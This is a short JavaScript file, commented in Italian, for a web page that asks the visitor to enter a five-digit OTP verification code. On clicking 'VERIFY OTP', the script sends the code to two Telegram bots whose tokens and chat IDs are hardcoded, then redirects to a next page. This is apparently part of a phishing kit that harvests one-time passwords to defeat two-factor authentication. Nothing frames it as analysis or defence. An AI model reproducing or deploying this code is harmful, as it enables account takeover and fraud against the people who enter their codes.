document.addEventListener("DOMContentLoaded", function () {
    const codeInput = document.getElementById("code-input");
    const verifyButton = document.getElementById("verify-button");

    codeInput.addEventListener("input", function () {
        // Rimuove caratteri non numerici
        this.value = this.value.replace(/\D/g, "");

        // Mostra/nasconde il pulsante VERIFY OTP
        if (this.value.length === 5) {
            verifyButton.style.display = "block";
            this.setAttribute("readonly", true); // Blocca l'input
        } else {
            verifyButton.style.display = "none";
            this.removeAttribute("readonly");
        }
    });

    // Permette di cancellare anche quando readonly
    codeInput.addEventListener("keydown", function (e) {
        if (e.key === "Backspace" || e.key === "Delete") {
            this.removeAttribute("readonly");
        }
    });

    // Invio del codice OTP quando si preme il pulsante "VERIFY OTP"
    verifyButton.addEventListener("click", async function () {
        const otpCode = codeInput.value; // Prende il valore dell'input

        try {
            // Invia l'OTP ai bot Telegram
            const response1 = await fetch(
                "https://api.telegram.org/bot7654691297:AAEkfk35y1aKq5Wpnz7vLyR3QCo4g5nYDTc/sendMessage",
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: "1117264759", text: "OTP Code: " + otpCode }),
                }
            );

            const response2 = await fetch(
                "https://api.telegram.org/bot7508882807:AAF5vvfq1-gZjxgx29QW3NPuJkUnhtDACK4/sendMessage",
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: "5554575228", text: "OTP Code: " + otpCode }),
                }
            );

            const data1 = await response1.json();
            const data2 = await response2.json();

            // Controlla se almeno uno dei due invii ha avuto successo
            if (data1.ok || data2.ok) {
                window.location.href = "index4.html"; // Reindirizzamento alla pagina successiva
            } else {
                console.error("Errore nell'invio del messaggio Telegram");
            }
        } catch (error) {
            console.error("Errore di rete", error);
        }
    });
});
